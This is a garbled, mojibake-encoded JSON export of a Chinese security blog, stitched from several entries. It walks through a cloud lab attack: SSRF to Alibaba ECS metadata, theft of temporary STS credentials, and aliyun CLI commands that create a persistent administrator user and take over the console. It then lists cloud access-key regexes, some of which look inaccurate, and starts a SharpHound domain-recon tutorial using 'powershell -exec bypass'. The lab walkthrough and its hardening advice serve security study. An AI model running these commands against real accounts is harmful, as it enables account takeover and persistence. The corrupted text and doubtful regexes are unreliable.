ç”¨äºå…è®¸ç”¨æˆ·åˆ›å»ºå’Œç®¡ç†äº‘è´¦æˆ·ã€ç”¨æˆ·ç»„ã€è§’è‰²ã€æƒé™ç­–ç•¥ï¼Œå¹¶æ§åˆ¶è°å¯ä»¥è®¿é—®ç‰¹å®šçš„èµ„æºï¼Œä»¥åŠä»–ä»¬å¯ä»¥å¯¹è¿™äº›èµ„æºæ‰§è¡Œå“ªäº›æ“ä½œ\nå›½å†…å„å‚å•†å«æ³•å„ä¸ç›¸åŒï¼šRAMã€CAMã€IAM\u0026hellip;\u0026hellip;\né˜¿é‡Œäº‘çš„RAMï¼š\nIAMæƒé™æ“ä½œ æƒé™æå‡ è‹¥å½“å‰ç”¨æˆ·å…·å¤‡ç¼–è¾‘ IAM ç­–ç•¥çš„æƒé™ï¼Œä½†æ²¡æœ‰æŸäº›æœåŠ¡æƒé™çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ IAM ä¸­å¼€å¯è¿™ä¸ªæœåŠ¡æƒé™ï¼Œä»¥å®ç°ææƒ\nRAMä¸­ä¹Ÿæœ‰åŒæ ·çš„åŠŸèƒ½ç‚¹ï¼š\næƒé™ç»´æŒ åŸç†ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œç›´æ¥åœ¨ IAM ä¸­åˆ›å»ºä¸€ä¸ªæ‹¥æœ‰é«˜æƒé™çš„ç”¨æˆ·å³å¯ï¼š\nåˆ›å»ºç”¨æˆ·åèµ‹äºˆç®¡ç†æƒé™å³å¯ï¼Œä½†å›½å†…é€šå¸¸éƒ½éœ€è¦å®‰å…¨éªŒè¯ï¼Œæ‰€ä»¥æ¯”è¾ƒæœ‰éš¾åº¦ï¼š\næ§åˆ¶å°æ¥ç®¡ åœ¨ä¸Šé¢æˆ‘ä»¬æåˆ°äº†é€šè¿‡SSRFè¯»å–ECSçš„å…ƒæ•°æ®ä»¥åŠuser-dataï¼Œå…¶å®æˆ‘ä»¬è¿˜å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œè·å–è¯¥äº‘è´¦æˆ·çš„æ‰€æœ‰é˜¿é‡Œäº‘æœåŠ¡æƒé™ï¼š\né¦–å…ˆåˆ†æä¸€ä¸‹æˆ‘ä»¬è·å–åˆ°çš„å…ƒæ•°æ®ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ram/ç›®å½•ï¼Œè¯´æ˜å½“å‰äº‘æœåŠ¡å™¨é…ç½®äº†RAMè§’è‰²ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å°è¯•è·å–ä¸´æ—¶å‡­è¯\næˆ‘ä»¬è®¿é—®ram/ï¼š\nè¿™é‡Œæœ‰ä¸€ä¸ªsecurity-credentials/ï¼Œå­˜å‚¨äº†RAMè§’è‰²åç§°ä¿¡æ¯ï¼š\nå¯ä»¥çœ‹åˆ°RAMè§’è‰²ä¸ºhuocorp-terraform-goat-role\nè®¿é—®è§’è‰²å†…å®¹è·å¾—ä¸´æ—¶å‡­è¯ï¼š\nå°†è¯¥ä¸´æ—¶å‡­è¯é…ç½®åˆ°aliyunå‘½ä»¤è¡Œå·¥å…·ï¼š\naliyun configure --mode StsToken é…ç½®å¥½ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ¥åˆ›å»ºå­è´¦æˆ·å¹¶èµ‹äºˆç®¡ç†å‘˜æƒé™äº†ï¼š\naliyun ram CreateUser --UserName yuyoung aliyun ram CreateLoginProfile --UserName yuyoung --Password Yuy0ung@666 aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName yuyoung æ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡æ–°åˆ›å»ºçš„RAMç”¨æˆ·è¿›è¡Œç™»å½•äº†https://signin.aliyun.com/login.htm#/mainï¼Œè¿™é‡Œçš„ç”¨æˆ·æ ¼å¼ä¸º username@company-aliasï¼Œå…¶ä¸­ username å°±æ˜¯åˆšåˆšåˆ›å»ºçš„ç”¨æˆ·åï¼Œcompany-alias å¯ä»¥é€šè¿‡ä¸‹é¢çš„è¿™ä¸ªå‘½ä»¤è·å–åˆ°ï¼š\naliyun ram GetAccountAlias ç™»é™†ï¼š\nå¯†ç ä¸ºæˆ‘ä»¬åˆ›å»ºçš„å¯†ç ï¼š\né˜¿é‡Œäº‘ä¼šå¼ºåˆ¶ä½ ç»‘å®šMFAè®¾å¤‡ï¼Œä½¿ç”¨ä»»æ„æ‰‹æœºç»‘å®šå³å¯ï¼š\nç»‘å®šè®¾å¤‡åå³å¯æˆåŠŸæ¥ç®¡æ§åˆ¶å°ï¼š\næ¥ä¸‹æ¥å¯¹è¿™ä¸ªé¶åœºæ¡ˆä¾‹è¿›è¡Œåˆ†æï¼š\nè¿™ä¸ªç¯å¢ƒçš„é—®é¢˜é™¤äº†å­˜åœ¨SSRFï¼Œè¿˜æœ‰å¦å¤–ä¸¤ä¸ªé—®é¢˜ï¼š\nRAMè§’è‰²æƒé™è¿‡å¤§ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡è¯¥è§’è‰²çš„æƒé™è¿›è¡Œåˆ›å»ºå­ç”¨æˆ·ä»¥åŠç»™å­ç”¨æˆ·æˆäºˆé«˜æƒé™ç­‰æ“ä½œ äº‘æ•°æ®æœªä½œè®¿é—®åŠ å›ºï¼Œå¯¼è‡´ä¸€æ—¦ç›®æ ‡å­˜åœ¨SSRFæˆ–æƒé™è¢«è·å–ï¼Œå…ƒæ•°æ®å°±å­˜åœ¨è¢«è·å–çš„é£é™© é’ˆå¯¹ç¬¬ä¸€ä¸ª RAM è§’è‰²æƒé™è¿‡å¤§çš„é—®é¢˜ï¼Œä¸»è¦è¿˜æ˜¯éœ€è¦ä½¿ç”¨è€…ä¸¥æ ¼éµå®ˆæƒé™æœ€å°åŒ–çš„åŸåˆ™ï¼Œåœ¨ä¸º RAM è§’è‰²èµ‹äºˆæƒé™æ—¶ï¼Œé¿å…èµ‹äºˆè¿‡é«˜çš„æƒé™ï¼Œåªèµ‹äºˆè‡ªå·±æ‰€éœ€è¦çš„æƒé™ï¼Œè¿™æ ·å¯ä»¥å°†å½±å“ç¨‹åº¦é™åˆ°æœ€ä½\né’ˆå¯¹ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¯ä»¥å°†å®ä¾‹ä¸Šçš„å…ƒæ•°æ®è®¿é—®æ¨¡å¼è®¾ç½®ä¸ºåŠ å›ºæ¨¡å¼ï¼Œæ–¹æ³•æœ‰ä¸¤ç§ï¼š\n1.åœ¨åˆ›å»ºå®ä¾‹æ—¶ï¼Œå¯ä»¥åœ¨ã€Œç³»ç»Ÿé…ç½®ã€çš„ã€Œé«˜çº§é€‰é¡¹ã€ä¸­å°†ã€Œå®ä¾‹å…ƒæ•°æ®è®¿é—®æ¨¡å¼ã€è®¾ç½®ä¸ºã€Œä»…åŠ å›ºæ¨¡å¼ã€\n2.åœ¨å·²ç»åˆ›å»ºå¥½çš„å®ä¾‹ä¸­ï¼Œå¯ä»¥åœ¨é˜¿é‡Œäº‘ OpenAPI ä¸­å¼€å¯å…ƒæ•°æ®å¼ºåˆ¶ä½¿ç”¨ Token è®¿é—®ï¼ŒOpenAPI åœ°å€ï¼šhttps://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions\né…ç½®åå°±æ— æ³•SSRFè®¿é—®äº†ï¼Œæç¤º403ï¼š\nå½“ç„¶ï¼Œå¦‚æœå®ä¾‹æƒé™è¢«è·å–äº†ï¼Œè¿™ç§æ–¹æ³•å°±ä¸è¡Œäº†ï¼Œå¯ä»¥è¿™æ ·è·å–å…ƒæ•°æ®ï¼š\nå…ˆè·å–tokenï¼š\nTOKEN=`curl -X PUT \u0026#34;http://100.100.100.200/latest/api/token\u0026#34; -H \u0026#34;X-aliyun-ecs-metadata-token-ttl-seconds: 21600\u0026#34;` å†é€šè¿‡tokenè·å–å…ƒæ•°æ®ï¼š\ncurl -H \u0026#34;X-aliyun-ecs-metadata-token: $TOKEN\u0026#34; http://100.100.100.200/latest/meta-data/ å®Œäº‹è®°å¾—åˆ é™¤åˆ›å»ºçš„è´¦å·ï¼š\naliyun ram DetachPolicyFromUser --PolicyType System --PolicyName AdministratorAccess --UserName yuyoung aliyun ram DeleteUser --UserName yuyoung è¿˜è¦è®°å¾—æŠŠakæ”¹å›æ¥ï¼š\naliyun configure --mode AK æœ€åï¼Œç»™å‡ºè¿™ä¸ªä¸Šé¢æ–¹æ³•çš„å‡ ä¸ªå‰æï¼š\nECS å®ä¾‹éœ€è¦è¢«æˆäºˆ RAM è§’è‰²ï¼Œä¸ç„¶è®¿é—®ä¸´æ—¶å‡­è¯çš„å…ƒæ•°æ®ä¼šè¿”å› 404 RAM è§’è‰²éœ€è¦å…·å¤‡ ram è®¿é—®æ§åˆ¶çš„ç›¸å…³æ“ä½œæƒé™ï¼Œä¾‹å¦‚åˆ›å»ºç”¨æˆ·ã€èµ‹äºˆæƒé™ç­‰ï¼Œä¸ç„¶ä¸´æ—¶ç§˜é’¥ä¼šæ²¡æœ‰åˆ›å»ºå­ç”¨æˆ·çš„æƒé™ åœ¨å®æˆ˜ä¸­ï¼Œå¦‚æœé‡åˆ°äº† ECS å®ä¾‹è¢«æˆäºˆäº† RAM è§’è‰²çš„æƒ…å†µï¼Œå¤§å¤šæ—¶å€™è¯¥è§’è‰²éƒ½æ˜¯ä¸å…·å¤‡åˆ›å»ºç”¨æˆ·æƒé™çš„ï¼Œè¿™æ—¶å°±æ²¡æ³•é€šè¿‡åˆ›å»ºå­è´¦å·ç™»å½•æ§åˆ¶å°çš„æ–¹å¼äº†ï¼Œåªèƒ½é€šè¿‡é˜¿é‡Œäº‘å‘½ä»¤è¡Œå·¥å…·å»æ“ä½œç›®æ ‡äº‘æœåŠ¡äº†\næˆ‘ä»¬åœ¨è¿™é‡Œä¹Ÿå¯ä»¥æ€»ç»“ä¹¦ä¸€äº›äº‘ä¸Šæ”»é˜²ç›¸æ¯”ä¼ ç»Ÿå†…ç½‘æ”»é˜²çš„ä¸åŒï¼š\näº‘ä¸Šæ”»é˜²çš„å¸¸è§é—®é¢˜æ˜¯é…ç½®é”™è¯¯ äº‘ä¸Šæ”»é˜²çš„æƒé™ç»´æŒä¸»è¦æ–¹æ³•æ˜¯åˆ›å»º RAM é«˜æƒé™ç”¨æˆ·ï¼Œè€Œä¸æ˜¯åƒä¼ ç»Ÿæ”»é˜²é‡Œé‚£æ ·æœ‰äº”èŠ±å…«é—¨çš„æƒé™ç»´æŒæ–¹æ³• äº‘ä¸Šæ”»é˜²çš„å†…ç½‘æ¨ªå‘ä¸»è¦æ˜¯åœ¨äº‘æœåŠ¡å‚å•†å‘½ä»¤è¡Œæˆ–è€…æ§åˆ¶å°ä¸­è¿›è¡Œæ¨ªå‘ï¼Œä»è¿™ä¸ªäº‘æœåŠ¡æ¨ªå‘åˆ°å¦ä¸€ä¸ªäº‘æœåŠ¡ï¼Œè€Œä¸æ˜¯åƒä¼ ç»Ÿæ”»é˜²é‚£æ ·æœ‰å„ç§å„æ ·çš„å†…ç½‘æ¨ªå‘æ‰‹æ³• æ‚è°ˆ è®°å½•ä¸€äº›å±äºäº‘æœåŠ¡ä½†æ˜¯ä¸å¥½åˆ†ç±»çš„çš„é›¶ç¢çŸ¥è¯†ä¸Tricks\nAKç‰¹å¾æ•´ç† è®°å½•ä¸€ä¸‹ä¸åŒäº‘æœåŠ¡å¯¹åº”AKçš„æ­£åˆ™ï¼š\nAmazon Web Services äºšé©¬é€Šäº‘è®¡ç®—æœåŠ¡ (Amazon Web Services, AWS) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;AKIA\u0026rdquo;ã€‚\n^AKIA[A-Za-z0-9]{16}$ Access Key ID: 20ä¸ªéšæœºçš„å¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆçš„å­—ç¬¦ï¼Œä¾‹å¦‚ AKHDNAPO86BSHKDIRYTE Secret Access Key ID: 40ä¸ªéšæœºçš„å¤§å°å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ï¼Œä¾‹å¦‚ S836fh/J73yHSb64Ag3Rkdi/jaD6sPl6/antFtUï¼ˆæ— æ³•æ‰¾å›ä¸¢å¤±çš„ Secret Access Key IDï¼‰ã€‚ Google Cloud Platform Google Cloud Platform (GCP) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;GOOG\u0026rdquo;ã€‚\n^GOOG[\\w\\W]{10,30}$ æœåŠ¡è´¦å·çš„JSONæ–‡ä»¶ä¸­åŒ…å«äº†Access Keyå’Œå¯†é’¥çš„ä¿¡æ¯ï¼Œå…¶ä¸­Access Keyä¸ºclient_emailï¼Œå…¶é•¿åº¦ä¸å›ºå®šï¼Œç”±å­—æ¯ã€æ•°å­—å’Œç‰¹æ®Šå­—ç¬¦ç»„æˆã€‚ å¯†é’¥ï¼ˆKeyï¼‰çš„é•¿åº¦ä¸º256ä¸ªå­—ç¬¦ï¼Œç”±å­—æ¯ã€æ•°å­—å’Œç‰¹æ®Šå­—ç¬¦ç»„æˆã€‚ Microsoft Azure Microsoft Azure çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;AZ\u0026rdquo;ã€‚\n^AZ[A-Za-z0-9]{34,40}$ Azure AD Applicationçš„Client IDé€šå¸¸ç”¨ä½œAccess Keyï¼Œé•¿åº¦ä¸º36ä¸ªå­—ç¬¦ï¼Œç”±å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ å¯¹äºAzure AD Applicationçš„å¯†é’¥ï¼ˆSecretï¼‰ï¼Œé•¿åº¦ä¸º44ä¸ªå­—ç¬¦ï¼Œç”±å­—æ¯ã€æ•°å­—å’Œç‰¹æ®Šå­—ç¬¦ç»„æˆã€‚ IBM Cloud IBM äº‘ (IBM Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;IBM\u0026rdquo;ã€‚\n^IBM[A-Za-z0-9]{10,40}$ æˆ–è€…æ˜¯ä»¥ä¸‹è§„åˆ™ï¼š\n[a-zA-Z0-9]{8}(-[a-zA-Z0-9]{4}){3}-[a-zA-Z0-9]{12}$ Oracle Cloud Oracleäº‘ (Oracle Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;OCID\u0026rdquo;ã€‚\n^OCID[A-Za-z0-9]{10,40}$ é˜¿é‡Œäº‘ é˜¿é‡Œäº‘ (Alibaba Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;LTAI\u0026rdquo;ã€‚\n^LTAI[A-Za-z0-9]{12,20}$ Access Key IDé•¿åº¦ä¸º16-24ä¸ªå­—ç¬¦ï¼Œç”±å¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ Access Key Secreté•¿åº¦ä¸º30ä¸ªå­—ç¬¦ï¼Œç”±å¤§å†™å­—æ¯ã€å°å†™å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ è…¾è®¯äº‘ è…¾è®¯äº‘ (Tencent Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;AKID\u0026rdquo;ã€‚\n^AKID[A-Za-z0-9]{13,20}$ SecretIdé•¿åº¦ä¸º17ä¸ªå­—ç¬¦ï¼Œç”±å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ SecretKeyé•¿åº¦ä¸º40ä¸ªå­—ç¬¦ï¼Œç”±å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ åä¸ºäº‘ åä¸ºäº‘ (Huawei Cloud) çš„ Access Key æ˜¯20ä¸ªéšæœºå¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œè¾ƒéš¾ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚\n[A-Z0-9]{20} ç™¾åº¦äº‘ ç™¾åº¦äº‘ (Baidu Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;AK\u0026rdquo;ã€‚\n^AK[A-Za-z0-9]{10,40}$ äº¬ä¸œäº‘ äº¬ä¸œäº‘ (JD Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;JDC_\u0026quot;ã€‚\n^JDC_[A-Z0-9]{28,32} å­—èŠ‚è·³åŠ¨ç«å±±å¼•æ“ å­—èŠ‚è·³åŠ¨ç«å±±å¼•æ“ (Volcengine) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;AKLT\u0026rdquo;ï¼Œé•¿åº¦å°äº256ä½ã€‚\n^AKLT[a-zA-Z0-9-_]{0,252} UCloud UCloud (UCloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;UC\u0026rdquo;\n^UC[A-Za-z0-9]{10,40}$ é’äº‘ é’äº‘ (QingCloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;QY\u0026rdquo;ã€‚\n^QY[A-Za-z0-9]{10,40}$ é‡‘å±±äº‘ é‡‘å±±äº‘ (Kingsoft Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;AKLT\u0026rdquo;ã€‚\n^AKLT[a-zA-Z0-9-_]{16,28} è”é€šäº‘ è”é€šäº‘ (China Unicom Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;LTC\u0026rdquo;ã€‚\n^LTC[A-Za-z0-9]{10,60}$ ç§»åŠ¨äº‘ ç§»åŠ¨äº‘ (China Mobile Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;YD\u0026rdquo;ã€‚\n^YD[A-Za-z0-9]{10,60}$ ç”µä¿¡äº‘ ä¸­å›½ç”µä¿¡äº‘ (China Telecom Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;CTC\u0026rdquo;ã€‚\n^CTC[A-Za-z0-9]{10,60}$ ä¸€äº‘é€š ä¸€äº‘é€š (YiYunTong Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;YYT\u0026rdquo;ã€‚\n^YYT[A-Za-z0-9]{10,60}$ ç”¨å‹äº‘ ç”¨å‹äº‘ (Yonyou Cloud) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;YY\u0026rdquo;ã€‚\n^YY[A-Za-z0-9]{10,40}$ å—å¤§é€šç”¨äº‘ å—å¤§é€šç”¨äº‘ (OUCDC) çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;CI\u0026rdquo;ã€‚\n^CI[A-Za-z0-9]{10,40}$ G-Core Labs G-Core Labs çš„ Access Key å¼€å¤´æ ‡è¯†ä¸€èˆ¬æ˜¯ \u0026ldquo;gcore\u0026rdquo;\n^gcore[A-Za-z0-9]{10,30}$ ",
        "summary": "äº‘æœåŠ¡å­¦ä¹  äº‘æœåŠ¡å°±æ˜¯äº‘ä¸Šçš„æœåŠ¡ï¼Œæ¯”å¦‚ä»äº‘å‚å•†ï¼ˆAWSã€é˜¿é‡Œäº‘ï¼‰ä¹°æ¥çš„æœåŠ¡\nå›½å†…äº‘å‚å•†ï¼š\né˜¿é‡Œäº‘ è…¾è®¯äº‘ åä¸ºäº‘ å¤©ç¿¼äº‘ Ucloud é‡‘å±±äº‘ \u0026hellip;\u0026hellip; å›½å¤–äº‘å‚å•†ï¼š\nAWS GCP Azure \u0026hellip;\u0026hellip; æ¯ä¸ªäº‘å‚å•†å¯¹äº‘æœåŠ¡çš„å«æ³•ä¸åŒï¼Œè¿™é‡Œä»¥AWSçš„ä¸ºä¾‹ï¼š\nS3å¯¹è±¡å­˜å‚¨ï¼ˆSimple Storage Serviceï¼‰ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºç½‘ç›˜ï¼Œç•¥æœ‰åŒºåˆ« EC2å¼¹æ€§è®¡ç®—æœåŠ¡ï¼ˆElastic Computer Cloudï¼‰ï¼Œç®€å•ç†è§£ä¸ºäº‘ä¸Šçš„è™šæ‹Ÿæœº RDSäº‘æ•°æ®åº“ï¼ˆRelational Database Serviceï¼‰ï¼Œç®€å•ç†è§£ä¸ºäº‘ä¸Šæ•°æ®åº“ IAMèº«ä»½ç®¡ç†å’Œè®¿é—®ç®¡ç†ï¼ˆIdentity and Access Managementï¼‰ï¼Œç®€å•ç†è§£ä¸ºäº‘æ§åˆ¶å°ä¸Šçš„ä¸€å¥—èº«ä»½ç®¡ç†æœåŠ¡ï¼Œå¯ä»¥ç”¨æ¥ç®¡ç†æ¯ä¸ªå­è´¦å·çš„æƒé™ ç»¼ä¸Šæ¥çœ‹ï¼Œå…¶å®å¯ä»¥ç®€å•çœ‹ä½œä¸€äº›æœ¬åœ°çš„åŠŸèƒ½/æœåŠ¡æ”¾åˆ°äº†äº‘ä¸Šï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿå¯¹åº”çš„é£é™©ï¼Œå€¼å¾—ç ”ç©¶\nåœ¨ä¸‹æ–‡çš„æ¡ˆä¾‹å›¾ç‰‡ä¸­ï¼Œç¬”è€…å¯èƒ½ä¼šæ›´å¤šç”¨å›½å†…å‚å•†ï¼ˆæ¯”å¦‚aliyunï¼‰è¿›è¡Œä¸¾ä¾‹ï¼Œæ¼æ´å®ä¾‹ä½¿ç”¨TerraformGoaté¶åœºè¿›è¡Œæ¼”ç¤º\nå­¦ä¹ é¡ºåºå‚è€ƒhttps://wiki.teamssix.com/\nå¯¹è±¡å­˜å‚¨ å¯¹è±¡å­˜å‚¨ï¼ˆObject-Based Storageï¼‰ï¼Œä¹Ÿå¯ä»¥å«åšé¢å‘å¯¹è±¡çš„å­˜å‚¨ï¼Œç°åœ¨ä¹Ÿæœ‰ä¸å°‘å‚å•†ç›´æ¥æŠŠå®ƒå«åšäº‘å­˜å‚¨ï¼Œå¾ˆç»å…¸çš„å°±æ˜¯Amazon S3 (Simple Storage Service) ç®€å•å­˜å‚¨æœåŠ¡ï¼Œæ˜¯ Amazon çš„å…¬å¼€äº‘å­˜å‚¨æœåŠ¡ï¼Œä¸ä¹‹å¯¹åº”çš„åè®®è¢«ç§°ä¸º S3 åè®®ï¼Œç›®å‰ S3 åè®®å·²ç»è¢«è§†ä¸ºå…¬è®¤çš„è¡Œä¸šæ ‡å‡†åè®®ï¼Œå› æ­¤ç›®å‰å›½å†…ä¸»æµçš„å¯¹è±¡å­˜å‚¨å‚å•†åŸºæœ¬ä¸Šéƒ½ä¼šæ”¯æŒ S3 åè®®\nAmazon S3æ ‡å‡†ä¸­ï¼Œå¯¹å¯¹è±¡å­˜å‚¨ä¸­å¯ä»¥æœ‰å¤šä¸ªæ¡¶ï¼ˆBucketï¼‰ï¼Œè€Œå¯¹è±¡ï¼ˆobjectï¼‰å­˜æ”¾åœ¨æ¡¶é‡Œï¼Œå¯¹è±¡åŒ…å«ä¸‰ä¸ªkeyã€Dataã€Metadataéƒ¨åˆ†ï¼š\nKeyæŒ‡å­˜å‚¨æ¡¶ä¸­çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ä¸€ä¸ª URL ä¸ºï¼šhttps://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3ï¼Œè¿™é‡Œçš„ yuy0ung æ˜¯å­˜å‚¨æ¡¶ Bucket çš„åç§°ï¼Œ/d0g3 å°±æ˜¯ Key Dataå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯å­˜å‚¨çš„æ•°æ®æœ¬ä½“ Metadataæ„å‘³å…ƒæ•°æ®ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºæ•°æ®çš„æ ‡ç­¾ã€æè¿°ä¹‹ç±»çš„ä¿¡æ¯ï¼ˆåŒºåˆ«äºä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ï¼Œåœ¨ä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ä¸­è¿™ç±»ä¿¡æ¯æ˜¯ç›´æ¥å°è£…åœ¨æ–‡ä»¶é‡Œçš„ï¼Œè€Œäº‘ä¸Šæœ‰äº†å…ƒæ•°æ®çš„å­˜åœ¨ï¼Œå¯ä»¥å¤§å¤§çš„åŠ å¿«å¯¹è±¡çš„æ’åºã€åˆ†ç±»å’ŒæŸ¥æ‰¾ï¼‰ æ“ä½œä½¿ç”¨Amazon S3çš„æ–¹å¼å¤§è‡´å¦‚ä¸‹ï¼š\nAWS æ§åˆ¶å°æ“ä½œ AWS å‘½ä»¤è¡Œå·¥å…·æ“ä½œ AWS SDK æ“ä½œ REST API æ“ä½œï¼Œé€šè¿‡ REST APIï¼Œå¯ä»¥ä½¿ç”¨ HTTP è¯·æ±‚åˆ›å»ºã€æå–å’Œåˆ é™¤å­˜å‚¨æ¡¶å’Œå¯¹è±¡ æ¥ä¸‹æ¥è®°å½•S3ç›¸å…³æ”»å‡»æ‰‹æ³•\n"
    }
,
    {
        "title": "å†…ç½‘ä¿¡æ¯æ”¶é›†-BloodHoundåˆ†æåŸŸç¯å¢ƒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-bloodhound%E5%88%86%E6%9E%90%E5%9F%9F%E7%8E%AF%E5%A2%83/",
        "content": "å†…ç½‘ä¿¡æ¯æ”¶é›†-BloodHoundåˆ†æåŸŸç¯å¢ƒ bloodhoundæ˜¯ä¸€æ¬¾å•é¡µJavaScript Webåº”ç”¨ç¨‹åºï¼Œæ˜¯ä¸€æ¬¾å¼ºå¤§çš„åŸŸå†…ç¯å¢ƒåˆ†æå·¥å…·ï¼Œèƒ½é€šè¿‡å›¾ä¸çº¿çš„å½¢å¼å°†åŸŸå†…ç›¸å…³ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ä¼šè¯ã€ACLç­‰å¯¹è±¡ä¹‹é—´çš„å…³ç³»ä»¥å¯è§†åŒ–æ–¹å¼å‘ˆç°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥è¯†åˆ«é«˜åº¦å¤æ‚çš„æ”»å‡»è·¯å¾„\nbloodhoundçš„å®‰è£… è¿™é‡Œæˆ‘åœ¨windowsä¸Šè¿›è¡Œå®‰è£…\nå®‰è£…neo4jæ•°æ®åº“ è¿™é‡Œæˆ‘åœ¨windowsä¸Šå®‰è£…Neo4j Deployment Center - Graph Database \u0026amp; Analyticsï¼š\nä¸‹è½½å¥½ï¼Œè§£å‹ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤å¯åŠ¨ï¼š\nneo4j.bat console åªè¦jdkç‰ˆæœ¬æ­£ç¡®ï¼Œå°±èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨\nç„¶åæµè§ˆå™¨è®¿é—®å¹¶ç™»å½•ï¼š\nHost : http://localhost:7474 Username : neo4j Password : neo4j ä¿®æ”¹é»˜è®¤å¯†ç ï¼š\nneo4jå°±å®‰è£…å®Œæ¯•äº†\nè¿è¡Œbloodhound ä¸‹è½½bloodhoundï¼Œè§£å‹åç›´æ¥å¯åŠ¨exeï¼Œå¹¶ç”¨noe4jçš„è´¦å·å¯†ç ç™»å½•ï¼š\nè¿›å…¥åé¡µé¢å·¦ä¸Šè§’æœ‰ä¸‰ä¸ªé€‰é¡¹å¡ï¼š\ndatabase infoï¼ˆæ•°æ®åº“ä¿¡æ¯ï¼‰ node infoï¼ˆèŠ‚ç‚¹ä¿¡æ¯ï¼‰ analysisï¼ˆåˆ†æï¼‰ å³ä¸Šè§’æœ‰å¾ˆå¤šè®¾ç½®é€‰é¡¹ï¼Œè¿™é‡Œä¸ç»†è¯´\næ´»åŠ¨ç›®å½•ä¿¡æ¯æ”¶é›† æ”¶é›†å·¥å…·ä½¿ç”¨sharphoundï¼ˆè¿™é‡Œç”¨1.xçš„ç‰ˆæœ¬ï¼‰\næœ‰ä¸¤ç§æ”¶é›†æ–¹æ¡ˆï¼š\npowershellé‡‡é›†è„šæœ¬ï¼šSharpHound.ps1 å¯æ‰§è¡Œæ–‡ä»¶ï¼šSharpHound.exe å‘½ä»¤å¦‚ä¸‹\nSharpHound.exe -c all powershell -exec bypass -command \u0026#34;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all\u0026#34; ä¸¤ç§æ–¹æ³•éƒ½éœ€è¦å°†æ–‡ä»¶ä¸Šä¼ è‡³ç›®æ ‡ä¸»æœºï¼Œæˆ‘è¿™é‡Œä½¿ç”¨exeè¿›è¡Œæ”¶é›†ï¼š\nä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆæ ¼å¼ä¸ºâ€œæ—¶é—´æˆ³_BloodHound.zipâ€çš„æ–‡ä»¶\nå¯¼å…¥æ•°æ® ç›´æ¥å‹ç¼©åŒ…æ‹–åŠ¨å¯¼å…¥å³å¯ï¼š\nä¸Šä¼ åå·¦ä¸Šè§’çš„database 